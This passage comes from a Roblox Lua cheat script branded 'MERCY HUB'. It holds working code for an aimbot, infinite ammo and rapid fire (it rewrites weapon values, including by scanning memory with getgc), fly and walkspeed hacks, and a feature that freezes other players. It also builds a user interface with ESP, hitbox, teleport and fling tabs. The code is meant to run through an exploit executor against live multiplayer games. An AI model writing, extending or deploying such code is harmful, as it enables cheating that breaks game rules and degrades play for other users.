            -- Damage
            elseif name:find("damage") or name:find("dmg") or name:find("power") or name:find("hit") or name:find("strength") or name:find("mult") or name:find("attack") or name:find("pwr") then
                table.insert(CachedDamageValues, v)
            end
        end
    end
    
    -- Check Attributes (Modern games)
    for name, _ in pairs(tool:GetAttributes()) do
        local lowName = name:lower()
        if lowName:find("ammo") or lowName:find("clip") or lowName:find("mag") or lowName:find("count") then
            -- Store attribute name and object
            TryRememberAttrOriginal("Ammo", tool, name)
            table.insert(CachedAmmoValues, {Object = tool, Attribute = name})
        elseif lowName:find("firerate") or lowName:find("delay") or lowName:find("cooldown") or lowName:find("time") or lowName:find("rate") or lowName:find("shoot") then
            TryRememberAttrOriginal("FireRate", tool, name)
            table.insert(CachedFireRateValues, {Object = tool, Attribute = name})
        elseif lowName:find("damage") or lowName:find("dmg") or lowName:find("power") then
            table.insert(CachedDamageValues, {Object = tool, Attribute = name})
        end
    end
end

-- Global Stats Scanner (ReplicatedStorage) - ONLY for Values (Safe)
local function SetupGlobalScanner()
    local function check(v)
        if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
            local name = v.Name:lower()
            if name:find("damage") or name:find("dmg") or name:find("power") or name:find("hit") then
                table.insert(CachedDamageValues, v)
            elseif name:find("ammo") or name:find("clip") or name:find("mag") then
                if not RageSeen.Ammo[v] then
                    RageSeen.Ammo[v] = true
                    TryRememberInstanceOriginal("Ammo", v)
                    table.insert(CachedAmmoValues, v)
                end
            elseif name:find("firerate") or name:find("delay") or name:find("cooldown") or name:find("time") or name:find("rate") or name:find("shoot") then
                if not RageSeen.FireRate[v] then
                    RageSeen.FireRate[v] = true
                    TryRememberInstanceOriginal("FireRate", v)
                    table.insert(CachedFireRateValues, v)
                end
            end
        end
        
        -- Check attributes in RS as well
        for name, _ in pairs(v:GetAttributes()) do
            local lowName = name:lower()
            if lowName:find("ammo") or lowName:find("clip") or lowName:find("mag") then
                TryRememberAttrOriginal("Ammo", v, name)
                table.insert(CachedAmmoValues, {Object = v, Attribute = name})
            elseif lowName:find("firerate") or lowName:find("delay") or lowName:find("cooldown") or lowName:find("time") or lowName:find("rate") or lowName:find("shoot") then
                TryRememberAttrOriginal("FireRate", v, name)
                table.insert(CachedFireRateValues, {Object = v, Attribute = name})
            elseif lowName:find("damage") or lowName:find("dmg") or lowName:find("power") then
                table.insert(CachedDamageValues, {Object = v, Attribute = name})
            end
        end
    end

    -- Initial Scan of common locations in ReplicatedStorage (Safe: No 'require' here)
    local RS = game:GetService("ReplicatedStorage")
    for _, v in ipairs(RS:GetDescendants()) do
        check(v)
    end
    
    -- Listen for new weapon data
    RS.DescendantAdded:Connect(check)
end
SetupGlobalScanner()

local function UpdateRage()
    if Config.InfAmmo then
        for i = #CachedAmmoValues, 1, -1 do
            local v = CachedAmmoValues[i]
            if type(v) == "table" and v.Object and v.Object.Parent then
                v.Object:SetAttribute(v.Attribute, 999)
            elseif typeof(v) == "Instance" and v.Parent then
                if v:IsA("StringValue") then v.Value = "999" else v.Value = 999 end
            else table.remove(CachedAmmoValues, i) end
        end
    end
    
    if Config.RapidFire then
        local mult = math.max(1, tonumber(Config.FireRateMultiplier) or 1)
        local minDelay = 0.01
        for i = #CachedFireRateValues, 1, -1 do
            local v = CachedFireRateValues[i]
            if type(v) == "table" and v.Object and v.Object.Parent then
                local obj = v.Object
                local attr = v.Attribute
                local originalTbl = RageOriginal.AttrFireRate[obj]
                local base = originalTbl and originalTbl[attr]
                local cur = obj:GetAttribute(attr)
                local baseNum = (type(base) == "number" and base) or (type(cur) == "number" and cur) or nil
                if baseNum then
                    obj:SetAttribute(attr, math.max(minDelay, baseNum / mult))
                end
            elseif typeof(v) == "Instance" and v.Parent then
                if v:IsA("StringValue") then
                    local base = RageOriginal.FireRate[v]
                    local baseNum = tonumber(base) or tonumber(v.Value)
                    if baseNum then
                        v.Value = tostring(math.max(minDelay, baseNum / mult))
                    end
                else
                    local base = RageOriginal.FireRate[v]
                    local baseNum = tonumber(base) or tonumber(v.Value)
                    if baseNum then
                        v.Value = math.max(minDelay, baseNum / mult)
                    end
                end
            else
                table.remove(CachedFireRateValues, i)
            end
        end
    end
end

-- Separate high-performance GC task
task.spawn(function()
    while task.wait(5) do -- Scan GC every 5 seconds instead of 3
        if not getgc or (not Config.InfAmmo and not Config.RapidFire) then continue end
        
        local ammoKeys = {Ammo=true, Clip=true, Mag=true, StoredAmmo=true, CurrentAmmo=true, MaxAmmo=true, RemainingAmmo=true, Bullets=true, ReserveAmmo=true, MagSize=true, ClipSize=true}
        local fireRateKeys = {FireRate=true, ShootRate=true, Delay=true, Cooldown=true, Wait=true, TimeBetweenShots=true, Rate=true}

        for _, v in pairs(getgc(true)) do
            if type(v) == "table" then
                if Config.InfAmmo then
                    for key, _ in pairs(ammoKeys) do
                        if rawget(v, key) ~= nil and type(v[key]) == "number" then
                            rawset(v, key, 999)
                        end
                    end
                end
                if Config.RapidFire then
                    for key, _ in pairs(fireRateKeys) do
                        if rawget(v, key) ~= nil and type(v[key]) == "number" then
                            rawset(v, key, 0.01)
                        end
                    end
                end
            end
        end
    end
end)

-- Efficient Tool Listeners (CPU Friendly)
local charAddedConn
local function SetupRageListeners()
    local function onChildAdded(child)
        if child:IsA("Tool") then
            task.wait(0.1) -- Small delay to ensure children load
            ScanTool(child)
        end
    end
    
    LocalPlayer.Backpack.ChildAdded:Connect(onChildAdded)
    
    if charAddedConn then charAddedConn:Disconnect() end
    charAddedConn = LocalPlayer.CharacterAdded:Connect(function(char)
        char.ChildAdded:Connect(onChildAdded)
        task.wait(0.5)
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do ScanTool(tool) end
    end)
    
    -- Initial Scan
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do ScanTool(tool) end
    if LocalPlayer.Character then
        for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do ScanTool(tool) end
        LocalPlayer.Character.ChildAdded:Connect(onChildAdded)
    end
end
SetupRageListeners()

-- Movement System
local function ToggleFreeze()
    Config.Frozen = not Config.Frozen
    
    -- Simulate Ping Spike in Stats
    pcall(function()
        settings().Network.IncomingReplicationLag = Config.Frozen and 1000 or 0
    end)
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then -- Don't anchor HRP to prevent running in place
                    part.Anchored = Config.Frozen
                end
            end
        end
    end
end

-- Fly Logic
local FlyBV, FlyBG
local function StartFly()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    FlyBV = Instance.new("BodyVelocity", root)
    FlyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    FlyBV.Velocity = Vector3.new(0, 0, 0)
    
    FlyBG = Instance.new("BodyGyro", root)
    FlyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    FlyBG.CFrame = root.CFrame
    
    task.spawn(function()
        while Config.FlyEnabled and root and root.Parent do
            local moveDir = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
            
            FlyBV.Velocity = moveDir * Config.FlySpeed
            FlyBG.CFrame = Camera.CFrame
            task.wait()
        end
        if FlyBV then FlyBV:Destroy() end
        if FlyBG then FlyBG:Destroy() end
    end)
end

-- Aimbot System
FOVCircle.Radius = Config.Aimbot_FOVRadius
FOVCircle.Color = Config.Aimbot_FOVColor

local function GetClosestPlayerToMouse()
    local target = nil
    local dist = Config.Aimbot_FOVRadius
    local now = tick()
    
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
            if Config.Aimbot_TeamCheck and v.Team == LocalPlayer.Team then continue end
            if GetPlayerStatus(v) == "Whitelist" then continue end
            
            local part = GetActualPartName(v, Config.Aimbot_TargetPart)
            if part then
                local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                if onScreen then
                    -- Throttle Wall Check for Aimbot (expensive)
                    local isVisible = true
                    if Config.Aimbot_WallCheck then
                        local lastCheck = v:GetAttribute("AimbotWallCheck") or 0
                        isVisible = v:GetAttribute("AimbotVisible")
                        if isVisible == nil or now - lastCheck > 0.1 then
                            isVisible = IsVisible(part, v.Character)
                            v:SetAttribute("AimbotWallCheck", now)
                            v:SetAttribute("AimbotVisible", isVisible)
                        end
                    end
                    
                    if not isVisible then continue end
                    
                    local mousePos = UserInputService:GetMouseLocation()
                    local magnitude = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
                    
                    if magnitude < dist then
                        target = part
                        dist = magnitude
                    end
                end
            end
        end
    end
    return target
end

RunService.RenderStepped:Connect(function()
    FOVCircle.Visible = Config.Aimbot_ShowFOV
    FOVCircle.Radius = Config.Aimbot_FOVRadius
    FOVCircle.Position = UserInputService:GetMouseLocation()
    FOVCircle.Color = Config.Aimbot_FOVColor
    
    if Config.Aimbot_Enabled and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayerToMouse()
        if target then
            -- Smoothing formula: higher value = slower/smoother movement.
            -- Using 1 / (Smoothing + 1) to ensure we never divide by zero and higher values feel 'heavier'.
            local smoothFactor = 1 / (Config.Aimbot_Smoothing + 1)
            
            if Config.Aimbot_Method == "Cam Lock" then
                local lookAt = CFrame.new(Camera.CFrame.Position, target.Position)
                Camera.CFrame = Camera.CFrame:Lerp(lookAt, smoothFactor)
            elseif Config.Aimbot_Method == "Mouse Lock" then
                local pos, onScreen = Camera:WorldToViewportPoint(target.Position)
                if onScreen then
                    local mousePos = UserInputService:GetMouseLocation()
                    local moveX = (pos.X - mousePos.X) * smoothFactor
                    local moveY = (pos.Y - mousePos.Y) * smoothFactor
                    
                    if mousemoverel then
                        mousemoverel(moveX, moveY)
                    else
                        -- Fallback: Use Camera manipulation
                        local lookAt = CFrame.new(Camera.CFrame.Position, target.Position)
                        Camera.CFrame = Camera.CFrame:Lerp(lookAt, smoothFactor * 0.5)
                    end
                end
            end
        end
    end
end)

-- UI Creation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AdvancedUI_v8"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = ParentContainer

local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
MainFrame.Size = UDim2.new(0, 600, 0, 450)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(180, 100, 255)
MainStroke.Thickness = 2
MainStroke.Transparency = 0.3
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Sidebar
local SideBar = Instance.new("Frame", MainFrame)
SideBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
SideBar.BorderSizePixel = 0
SideBar.Size = UDim2.new(0, 160, 1, 0)
local SideCorner = Instance.new("UICorner", SideBar)
SideCorner.CornerRadius = UDim.new(0, 12)

local SideRightFix = Instance.new("Frame", SideBar)
SideRightFix.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
SideRightFix.BorderSizePixel = 0
SideRightFix.Position = UDim2.new(1, -10, 0, 0)
SideRightFix.Size = UDim2.new(0, 10, 1, 0)

local SideStroke = Instance.new("UIStroke", SideBar)
SideStroke.Color = Color3.fromRGB(180, 100, 255)
SideStroke.Thickness = 1
SideStroke.Transparency = 0.8
SideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local TitleLabel = Instance.new("TextLabel", SideBar)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 0, 0, 20)
TitleLabel.Size = UDim2.new(1, 0, 0, 40)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "MERCY HUB"
TitleLabel.TextColor3 = Color3.fromRGB(180, 100, 255)
TitleLabel.TextSize = 20
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center

local VersionLabel = Instance.new("TextLabel", SideBar)
VersionLabel.BackgroundTransparency = 1
VersionLabel.Position = UDim2.new(0, 0, 0, 45)
VersionLabel.Size = UDim2.new(1, 0, 0, 20)
VersionLabel.Font = Enum.Font.GothamBold
VersionLabel.Text = "v1"
VersionLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
VersionLabel.TextSize = 10
VersionLabel.TextXAlignment = Enum.TextXAlignment.Center

local TabHolder = Instance.new("Frame", SideBar)
TabHolder.BackgroundTransparency = 1
TabHolder.Position = UDim2.new(0, 10, 0, 80)
TabHolder.Size = UDim2.new(1, -20, 1, -100)

local TabList = Instance.new("UIListLayout", TabHolder)
TabList.Padding = UDim.new(0, 5)
TabList.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function CreateTabBtn(text)
    local btn = Instance.new("TextButton", TabHolder)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.BorderSizePixel = 0
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.Font = Enum.Font.GothamBold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(150, 150, 150)
    btn.TextSize = 12
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    
    local glow = Instance.new("UIStroke", btn)
    glow.Color = Color3.fromRGB(180, 100, 255)
    glow.Thickness = 1
    glow.Transparency = 1
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    local indicator = Instance.new("Frame", btn)
    indicator.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
    indicator.BorderSizePixel = 0
    indicator.Position = UDim2.new(0, 4, 0.2, 0)
    indicator.Size = UDim2.new(0, 2, 0.6, 0)
    indicator.Visible = false
    Instance.new("UICorner", indicator)

    return btn, indicator, glow
end

local AimbotBtn, AimbotIndicator, AimbotGlow = CreateTabBtn("Aimbot")
local HitboxBtn, HitboxIndicator, HitboxGlow = CreateTabBtn("Hitbox")
local ESPBtn, ESPIndicator, ESPGlow = CreateTabBtn("ESP")
local RageBtn, RageIndicator, RageGlow = CreateTabBtn("Rage")
local MiscBtn, MiscIndicator, MiscGlow = CreateTabBtn("Misc")
local FreezeBtnTab, FreezeIndicator, FreezeGlow = CreateTabBtn("Freeze")
local WhitelistBtnTab, WhitelistIndicator, WhitelistGlow = CreateTabBtn("Whitelist")
local GameBtnTab, GameIndicator, GameGlow = CreateTabBtn("Game")

local ContentContainer = Instance.new("Frame", MainFrame)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Position = UDim2.new(0, 170, 0, 20)
ContentContainer.Size = UDim2.new(1, -190, 1, -40)

local function CreateFrame(name)
    local f = Instance.new("ScrollingFrame", ContentContainer)
    f.Name = name
    f.BackgroundTransparency = 1
    f.Size = UDim2.new(1, 0, 1, 0)
    f.ScrollBarThickness = 2
    f.ScrollBarImageColor3 = Color3.fromRGB(180, 100, 255)
    f.ScrollBarImageTransparency = 0.5
    f.Visible = false
    f.CanvasSize = UDim2.new(0, 0, 0, 0)
    f.AutomaticCanvasSize = Enum.AutomaticSize.Y
    
    local layout = Instance.new("UIListLayout", f)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.Padding = UDim.new(0, 12)
    
    Instance.new("UIPadding", f).PaddingTop = UDim.new(0, 5)
    return f
end

local HitboxFrame = CreateFrame("HitboxFrame")
local AimbotFrame = CreateFrame("AimbotFrame")
local ESPFrame = CreateFrame("ESPFrame")
local RageFrame = CreateFrame("RageFrame")
local MiscFrame = CreateFrame("MiscFrame")
local FreezeFrame = CreateFrame("FreezeFrame")
local WhitelistFrame = CreateFrame("WhitelistFrame")
local GameFrame = CreateFrame("GameFrame")

-- Modify WhitelistFrame into a Two-Column Layout
WhitelistFrame:ClearAllChildren()
WhitelistFrame.ScrollingEnabled = false

local SelectedPlayerVar = nil

local LeftColumn = Instance.new("Frame", WhitelistFrame)
LeftColumn.Name = "LeftColumn"
LeftColumn.BackgroundTransparency = 1
LeftColumn.Position = UDim2.new(0, 10, 0, 0)
LeftColumn.Size = UDim2.new(0.35, 0, 1, 0)

local PlayersTitle = Instance.new("TextLabel", LeftColumn)
PlayersTitle.Name = "PlayersTitle"
PlayersTitle.BackgroundTransparency = 1
PlayersTitle.Size = UDim2.new(1, 0, 0, 20)
PlayersTitle.Font = Enum.Font.GothamBold
PlayersTitle.Text = "Players"
PlayersTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
PlayersTitle.TextSize = 14
PlayersTitle.TextXAlignment = Enum.TextXAlignment.Left

local SearchBar = Instance.new("TextBox", LeftColumn)
SearchBar.Name = "SearchBar"
SearchBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SearchBar.Position = UDim2.new(0, 0, 0, 25)
SearchBar.Size = UDim2.new(1, 0, 0, 30)
SearchBar.Font = Enum.Font.Gotham
SearchBar.PlaceholderText = "Search player..."
SearchBar.Text = ""
SearchBar.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBar.TextSize = 12
Instance.new("UICorner", SearchBar).CornerRadius = UDim.new(0, 6)

local PlayerList = Instance.new("ScrollingFrame", LeftColumn)
PlayerList.Name = "PlayerList"
PlayerList.BackgroundTransparency = 1
PlayerList.Position = UDim2.new(0, 0, 0, 60)
PlayerList.Size = UDim2.new(1, 0, 1, -65)
PlayerList.ScrollBarThickness = 2
PlayerList.ScrollBarImageColor3 = Color3.fromRGB(180, 100, 255)
Instance.new("UIListLayout", PlayerList).Padding = UDim.new(0, 5)

local RightColumn = Instance.new("Frame", WhitelistFrame)
RightColumn.Name = "RightColumn"
RightColumn.BackgroundTransparency = 1
RightColumn.Position = UDim2.new(0.38, 10, 0, 0)
RightColumn.Size = UDim2.new(0.58, 0, 1, 0)

local SelectedTitle = Instance.new("TextLabel", RightColumn)
SelectedTitle.Name = "SelectedTitle"
SelectedTitle.BackgroundTransparency = 1
SelectedTitle.Size = UDim2.new(1, 0, 0, 20)
SelectedTitle.Font = Enum.Font.GothamBold
SelectedTitle.Text = "Selected Player"
SelectedTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
SelectedTitle.TextSize = 14
SelectedTitle.TextXAlignment = Enum.TextXAlignment.Left

local PlayerInfoBox = Instance.new("Frame", RightColumn)
PlayerInfoBox.Name = "PlayerInfoBox"
PlayerInfoBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
PlayerInfoBox.Position = UDim2.new(0, 0, 0, 25)
PlayerInfoBox.Size = UDim2.new(1, 0, 0, 110) -- Smaller box
Instance.new("UICorner", PlayerInfoBox).CornerRadius = UDim.new(0, 8)

local InfoStroke = Instance.new("UIStroke", PlayerInfoBox)
InfoStroke.Color = Color3.fromRGB(180, 100, 255)
InfoStroke.Thickness = 1
InfoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local InfoLabel = Instance.new("TextLabel", PlayerInfoBox)
InfoLabel.Name = "InfoLabel"
InfoLabel.BackgroundTransparency = 1
InfoLabel.Size = UDim2.new(1, 0, 0, 40)
InfoLabel.Position = UDim2.new(0, 0, 1, -40)
InfoLabel.Font = Enum.Font.GothamBold
InfoLabel.Text = "No player selected"
InfoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
InfoLabel.TextSize = 12

local ViewportFrame = Instance.new("ViewportFrame", PlayerInfoBox)
ViewportFrame.Name = "PlayerViewport"
ViewportFrame.BackgroundTransparency = 1
ViewportFrame.Size = UDim2.new(1, 0, 1, -40)
ViewportFrame.Position = UDim2.new(0, 0, 0, 5)

local ViewportCamera = Instance.new("Camera")
ViewportFrame.CurrentCamera = ViewportCamera
ViewportCamera.Parent = ViewportFrame

local PriorityLabel = Instance.new("TextLabel", RightColumn)
PriorityLabel.Name = "PriorityLabel"
PriorityLabel.BackgroundTransparency = 1
PriorityLabel.Position = UDim2.new(0, 0, 0, 140) -- Moved up
PriorityLabel.Size = UDim2.new(1, 0, 0, 20)
PriorityLabel.Font = Enum.Font.Gotham
PriorityLabel.Text = "Priority: —"
PriorityLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
PriorityLabel.TextSize = 11

local ActionsTitle = Instance.new("TextLabel", RightColumn)
ActionsTitle.Name = "ActionsTitle"
ActionsTitle.BackgroundTransparency = 1
ActionsTitle.Position = UDim2.new(0, 0, 0, 165) -- Moved up
ActionsTitle.Size = UDim2.new(1, 0, 0, 20)
ActionsTitle.Font = Enum.Font.GothamBold
ActionsTitle.Text = "Actions"
ActionsTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
ActionsTitle.TextSize = 12
ActionsTitle.TextXAlignment = Enum.TextXAlignment.Left

local ActionsGrid = Instance.new("Frame", RightColumn)
ActionsGrid.Name = "ActionsGrid"
ActionsGrid.BackgroundTransparency = 1
ActionsGrid.Position = UDim2.new(0, 0, 0, 190) -- Moved up
ActionsGrid.Size = UDim2.new(1, 0, 1, -190)

local function CreateActionBtn(text, size, pos)
    local btn = Instance.new("TextButton", ActionsGrid)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Size = size
    btn.Position = pos
    btn.Font = Enum.Font.GothamBold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11 -- Smaller text
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(180, 100, 255)
    stroke.Thickness = 1
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    return btn
end

local TeleportBtn = CreateActionBtn("Teleport", UDim2.new(0.48, 0, 0, 28), UDim2.new(0, 0, 0, 0))
local SpectateBtn = CreateActionBtn("Spectate", UDim2.new(0.48, 0, 0, 28), UDim2.new(0.52, 0, 0, 0))
local WhitelistActionBtn = CreateActionBtn("Whitelist", UDim2.new(0.48, 0, 0, 28), UDim2.new(0, 0, 0, 35))
local FlingBtn = CreateActionBtn("Fling", UDim2.new(0.48, 0, 0, 28), UDim2.new(0.52, 0, 0, 35))
local TargetActionBtn = CreateActionBtn("Target", UDim2.new(1, 0, 0, 28), UDim2.new(0, 0, 0, 70))

local GameFrame = CreateFrame("GameFrame")
AimbotFrame.Visible = true

local function CreateButton(text, parent)
    local btn = Instance.new("TextButton", parent)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Size = UDim2.new(1, 0, 0, 38)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.TextSize = 14
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(180, 100, 255)
    stroke.Thickness = 1
    stroke.Transparency = 0.8
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    btn.MouseEnter:Connect(function()
        stroke.Transparency = 0.3
        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    end)
    btn.MouseLeave:Connect(function()
        stroke.Transparency = 0.8
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)
    
    return btn
end

-- Slider Function
local function CreateSlider(text, parent, min, max, default, callback)
    local container = Instance.new("Frame", parent)
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1, 0, 0, 65)
    
    local label = Instance.new("TextLabel", container)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 0, 25)
    label.Font = Enum.Font.GothamSemibold
    label.Text = text .. ": " .. default
    label.TextColor3 = Color3.fromRGB(200, 200, 200)
    label.TextSize = 13
    label.TextXAlignment = Enum.TextXAlignment.Left
    
    local sliderBar = Instance.new("Frame", container)
    sliderBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    sliderBar.Position = UDim2.new(0, 0, 0, 35)
    sliderBar.Size = UDim2.new(1, 0, 0, 6)
    Instance.new("UICorner", sliderBar)
    
    local fill = Instance.new("Frame", sliderBar)
    fill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
    fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    Instance.new("UICorner", fill)
    
    local knob = Instance.new("TextButton", sliderBar)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    knob.Position = UDim2.new((default - min) / (max - min), -6, 0.5, -6)
    knob.Size = UDim2.new(0, 12, 0, 12)
    knob.Text = ""
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    
    local knobStroke = Instance.new("UIStroke", knob)
    knobStroke.Color = Color3.fromRGB(180, 100, 255)
    knobStroke.Thickness = 2
    
    local dragging = false
    local function update(input)
        local pos = math.clamp((input.Position.X - sliderBar.AbsolutePosition.X) / sliderBar.AbsoluteSize.X, 0, 1)
        local val = math.floor(min + (max - min) * pos)
        fill.Size = UDim2.new(pos, 0, 1, 0)
        knob.Position = UDim2.new(pos, -6, 0.5, -6)
        label.Text = text .. ": " .. val
        return val
    end
    
    knob.InputBegan:Connect(function(input) 
        if input.UserInputType == Enum.UserInputType.MouseButton1 then 
            dragging = true 
        end 
    end)
    
    UserInputService.InputEnded:Connect(function(input) 
        if input.UserInputType == Enum.UserInputType.MouseButton1 then 
            dragging = false 
        end 
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local val = update(input)
            callback(val)
        end
    end)
    
    return container
end

-- Tab Elements
local ToggleBtn = CreateButton("Status: Disabled", HitboxFrame)
local ShowHitboxToggleBtn_HitboxTab = CreateButton("Show Hitbox: OFF", HitboxFrame)
local TeamToggle = CreateButton("Team Check: OFF", HitboxFrame)
local WallToggle = CreateButton("Wall Check: OFF", HitboxFrame)
local PartCycle = CreateButton("Target: Body", HitboxFrame)

-- Aimbot Tab
local AimbotToggleBtn = CreateButton("Aimbot: OFF", AimbotFrame)
local AimbotMethodBtn = CreateButton("Method: Cam Lock", AimbotFrame)
local AimbotShowFOVBtn = CreateButton("Show FOV: OFF", AimbotFrame)
local AimbotTeamCheckBtn = CreateButton("Team Check: OFF", AimbotFrame)
local AimbotWallCheckBtn = CreateButton("Wall Check: OFF", AimbotFrame)
local AimbotPartCycle = CreateButton("Aimbot Target: Head", AimbotFrame)
local AimbotFOVSlider = CreateSlider("FOV Radius", AimbotFrame, 10, 800, 150, function(val) Config.Aimbot_FOVRadius = val end)
local AimbotSmoothSlider = CreateSlider("Smoothing", AimbotFrame, 1, 25, 5, function(val) Config.Aimbot_Smoothing = val end)
local SizeInput = Instance.new("TextBox", HitboxFrame)
SizeInput.Size = UDim2.new(0.9, 0, 0, 35); SizeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
SizeInput.PlaceholderText = "Size (10)"; SizeInput.Text = ""; SizeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", SizeInput)

local ESPToggleBtn = CreateButton("ESP Toggle: OFF (Q)", ESPFrame)
local ChamsToggleBtn = CreateButton("Chams: OFF", ESPFrame)
local HitboxEspToggleBtn = CreateButton("Show Hitbox: OFF", ESPFrame)
local CleanVisualsToggle = CreateButton("Clean Visuals: ON", ESPFrame)
local HealthToggleBtn = CreateButton("Health Text: OFF", ESPFrame)
local DisplayNameToggleBtn = CreateButton("Show Names: OFF", ESPFrame)
local VisCheckToggleBtn = CreateButton("Visible Check: OFF", ESPFrame)

-- Rage Tab
local InfAmmoBtn = CreateButton("Infinite Ammo: OFF", RageFrame)
local RapidFireBtn = CreateButton("Rapid Fire: OFF", RageFrame)
local FireRateSlider = CreateSlider("Rapid Fire Speed", RageFrame, 1, 10, 1, function(val) Config.FireRateMultiplier = val end)

-- Misc Tab
local WalkSpeedToggleBtn = CreateButton("WalkSpeed: OFF", MiscFrame)
local WalkSpeedSlider = CreateSlider("Walk Speed", MiscFrame, 16, 200, 16, function(val) 
    Config.WalkSpeed = val
    if Config.WalkSpeedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.WalkSpeed = val
    end
end)
local FlyToggleBtn = CreateButton("Fly: OFF", MiscFrame)
local FlySpeedSlider = CreateSlider("Fly Speed", MiscFrame, 10, 200, 50, function(val) Config.FlySpeed = val end)
local RenderQualitySlider = CreateSlider("Render Quality", MiscFrame, 1, 21, 21, function(val)
    Config.RenderQuality = val
    pcall(function()
        settings().Rendering.QualityLevel = val
    end)
end)

local FreezeToggleBtn = CreateButton("Freeze Players: OFF (T)", FreezeFrame)

-- UI Logic
local function UpdateWhitelistTab()
    for _, child in ipairs(PlayerList:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    
    local searchText = SearchBar.Text:lower()
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        if searchText ~= "" and not player.Name:lower():find(searchText) then continue end
        
